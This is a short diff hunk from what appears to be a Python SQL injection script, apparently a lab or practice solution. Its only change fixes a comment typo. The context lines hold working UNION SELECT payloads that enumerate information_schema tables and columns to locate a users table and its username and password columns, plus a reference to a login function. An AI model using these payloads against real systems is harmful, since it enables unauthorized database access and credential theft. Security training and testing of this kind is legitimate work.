@@ -87,7 +87,7 @@ def login(username: str, password: str) -> None:
 
 
 def main() -> None:
-    query_tables = "'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--" # The first query we will send will get info about the sql tablee, to look for the table that has users in it.
+    query_tables = "'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--" # The first query we will send will get info about the sql table, to look for the table that has users in it.
     user_table = extract_user_table(query_tables)
     query_columns =  f"'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='{user_table}'--"  # The second query will get the column name from the table we found in the first query. Username and password columns expected
     user_columns = extract_user_columns(query_columns)
